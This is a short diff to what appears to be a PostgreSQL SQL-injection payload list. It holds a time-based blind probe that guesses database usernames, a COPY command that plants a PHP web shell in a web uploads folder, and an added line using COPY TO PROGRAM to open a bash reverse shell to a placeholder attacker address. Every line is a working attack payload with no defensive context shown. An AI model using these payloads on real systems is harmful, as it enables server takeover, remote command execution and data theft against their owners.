@@ -4,3 +4,4 @@
 1' AND (SELECT pg_sleep(3) FROM pg_user WHERE SUBSTRING(usename,1,1) = 'a') IS NOT NULL-- 
 SELECT * FROM pg_available_extensions;
 COPY (SELECT $$<?php system($_GET['cmd']); ?>$$) TO '/var/www/html/uploads/shell.php';
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<your-ip>/4444 0>&1"';
